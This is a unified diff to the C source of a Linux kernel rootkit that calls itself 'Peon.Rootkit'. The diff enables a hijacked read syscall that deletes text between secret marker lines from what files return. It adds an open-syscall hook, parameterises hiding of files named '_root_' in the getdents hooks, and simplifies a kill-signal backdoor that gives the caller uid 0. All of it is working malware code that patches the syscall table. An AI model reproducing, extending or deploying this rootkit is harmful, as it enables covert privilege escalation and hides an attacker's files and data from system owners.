@@ -31,8 +31,10 @@
 #include <asm/uaccess.h>
 
 
-//#define HOOK_READ
+#define HOOK_READ
 //#define HIDE_MODULE
+#define SECRETLINE "_peon_"
+#define SECRETFILE "_root_"
 #define NETWORK
 #define DEBUG
 #define SIG_4_ROOT 9
@@ -54,7 +56,6 @@
 #endif 
 
 
-static struct kmem_cache *cred_jar;
 
 struct linux_dirent {
 	unsigned long   d_ino;
@@ -238,11 +239,6 @@ Beak(Pause): 0x1b 0x5B 0x50
 Four byte keys:
 ################
 
-F1:          0x1b 0x5B 0x5B 0x41
-F2:          0x1b 0x5B 0x5B 0x42
-F3:          0x1b 0x5B 0x5B 0x43
-F4:          0x1b 0x5B 0x5B 0x44
-F5:          0x1b 0x5B 0x5B 0x45
 Ins:         0x1b 0x5B 0x32 0x7E
 Home:        0x1b 0x5B 0x31 0x7E
 PgUp:        0x1b 0x5B 0x35 0x7E
@@ -250,17 +246,6 @@ Del:         0x1b 0x5B 0x33 0x7E
 End:         0x1b 0x5B 0x34 0x7E
 PgDn:        0x1b 0x5B 0x36 0x7E
 
-
-Five byte keys:
-################
-
-F6:          0x1b 0x5B 0x31 0x37 0x7E
-F7:          0x1b 0x5B 0x31 0x38 0x7E
-F8:          0x1b 0x5B 0x31 0x39 0x7E
-F9:          0x1b 0x5B 0x32 0x30 0x7E
-F10:         0x1b 0x5B 0x32 0x31 0x7E
-F11:         0x1b 0x5B 0x32 0x33 0x7E
-F12:         0x1b 0x5B 0x32 0x34 0x7E
 */
 
 
@@ -329,16 +314,61 @@ void check_keyboard_buf(char __user *buf){
 
 
 	asmlinkage long (*orig_read_call) (unsigned int fd, char __user *buf, size_t count); 
-	asmlinkage long hook_read_call(unsigned int fd,char __user *buf, size_t count){
-		
-		long ret = orig_read_call( fd, buf, count);
-		if (fd==0){
-		check_keyboard_buf(buf);
+	asmlinkage long hook_read_call(unsigned int fd, char __user *buf, size_t count) {
 
+	    long ret = orig_read_call(fd, buf, count);
+
+	    
+	    if (ret < 0)return ret;
+		if (fd == 0) {
+		//check_keyboard_buf(buf);
+
+	    }
+
+	    if ((fd < 50)&&(fd > 2)) {
+	    
+		char *kbuf, *ch,*ch2;
+	    	long modif_ret=0;
+
+		kbuf = (char*) kmalloc(ret + 1, GFP_KERNEL);
+
+		if (kbuf == NULL) {
+			return ret;
+			}
+		memset(kbuf, 0, ret + 1);
+		copy_from_user(kbuf, buf, ret);
+
+		ch = strstr(kbuf, SECRETLINE);
+		if (ch!=NULL){
+		ch2 = strstr(ch+strlen(SECRETLINE)+1, SECRETLINE);
 		}
-		return  ret;
-	} 
+
+		//if find
+		if(ch!=NULL && ch2!=NULL){
+		modif_ret=strlen(ch)-strlen(ch2);
+		memmove(ch,    ch2+strlen(SECRETLINE),   strlen(ch2)-strlen(SECRETLINE)+1);		
+		copy_to_user(buf, kbuf, ret);		
+		}
+		kfree(kbuf);
+		return ret;
+	    }
+
+	    return ret;
+	}
+
 #endif
+
+#ifdef HOOK_OPEN
+
+	asmlinkage long (*orig_open_call) (const char  __user *filename,int flags,int mode); 
+	asmlinkage long hook_open_call(const char  __user *filename,int flags,int mode) {
+
+	int ret=orig_open_call(filename,flags,mode);
+	return ret;
+	}
+#endif
+
+
 
 
 #if defined(OS_64_BITS) 
@@ -357,7 +387,7 @@ asmlinkage long hacked_getdents(unsigned int fd,  struct linux_dirent __user *di
 
 			dir=(void*)dirent+off;
 			/* hide files containing name _root_ */	
-			if((strstr(dir->d_name, "_root_")) != NULL){
+			if((strstr(dir->d_name, SECRETFILE)) != NULL){
 				printk(KERN_ALERT "Peon.Rootkit: hide.64 %s",dir->d_name);
 				ret-=dir->d_reclen;
 				if(dir->d_reclen+off<ret)
@@ -386,7 +416,7 @@ asmlinkage long hacked_getdents64 (unsigned int fd,  struct linux_dirent64 __use
 
 			dir=(void*)dirent+off;
 			/* hide files containing name _root_ */	
-			if((strstr(dir->d_name, "_root_")) != NULL){
+			if((strstr(dir->d_name, SECRETFILE)) != NULL){
 				printk(KERN_ALERT "Peon.Rootkit: hide %s",dir->d_name);
 				ret-=dir->d_reclen;
 				if(dir->d_reclen+off<ret)
@@ -407,35 +437,20 @@ asmlinkage long kill_hook_call( pid_t pid, int sig){
 	if((sig ==SIG_4_ROOT) &&(pid==PID_4_ROOT))
 	{
 		struct task_struct *cur_task;
-		const struct cred *old;
 		struct cred *credz;
-
-		cred_jar = kmem_cache_create("cred_jar", sizeof(struct cred), 0, SLAB_HWCACHE_ALIGN|SLAB_PANIC, NULL);
-		credz = kmem_cache_alloc(cred_jar, GFP_KERNEL);
-		if (!credz){
-			#ifdef DEBUG
-			printk(KERN_ALERT "Peon.Rootkit: [KILL -88 88]  bug alloc");
-			#endif
-			return kill_orig_call(pid,sig);
-		}
-		/* obtain root access in shell*/
+		
 		cur_task=current;
-		/**/
-		old = cur_task->cred;
-
-		/* remove warning const */
-		memcpy(credz, old, sizeof(struct cred));
+		credz=cur_task->cred;
 		credz->uid=0;
-		credz->gid=0;
+		/*credz->gid=0;
 		credz->suid=0;
 		credz->sgid=0;
 		credz->euid=0;
-		credz->egid=0; 
+		credz->egid=0; */
 		cur_task->cred=credz;
 		#ifdef DEBUG
-		printk(KERN_ALERT "Peon.Rootkit: [KILL -88 88]  shell root access");
+		printk(KERN_ALERT "Peon.Rootkit: [KILL -%d %d]  shell root access",SIG_4_ROOT,PID_4_ROOT);
 		#endif
-		kfree(old);
 	}
 
 	/*   show hided module  kill -22 22*/    
@@ -476,11 +491,12 @@ int dev_func(struct sk_buff *skb, struct net_device *dev, struct packet_type *pk
 				append_filez(TEST_PATH,data,strlen(data));
 				
 				#endif
-				kfree_skb(skb);
+				
 			}
 
 		}
 	}
+	kfree_skb(skb);
 	return 0;
 }
 
@@ -560,6 +576,8 @@ int init_module(void)
 		#endif
 #endif
 
+
+
 #ifdef HOOK_READ
 	/*  Save the adress of the original read syscall */
 	orig_read_call= (void *) syscall_table[__NR_read];
@@ -570,6 +588,12 @@ int init_module(void)
 	#ifdef DEBUG
 		printk(KERN_INFO "Peon.Rootkit: HooKeD Read!\n");
 		#endif
+#endif
+
+#ifdef HOOK_OPEN
+	orig_open_call= (void *) syscall_table[__NR_open];
+
+	syscall_table[__NR_open] = (void*) hook_open_call;
 #endif
 
 	enable_wp(); 
@@ -592,6 +616,11 @@ void cleanup_module(void)
 	#ifdef HOOK_READ
 	syscall_table[ __NR_read ] = (void*) orig_read_call;
 	#endif
+
+	#ifdef HOOK_OPEN
+	syscall_table[ __NR_open ] = (void*) orig_open_call;
+	#endif
+
 
 	#if defined(OS_64_BITS)  
 		syscall_table[ __NR_getdents] = (void*) orig_getdents;
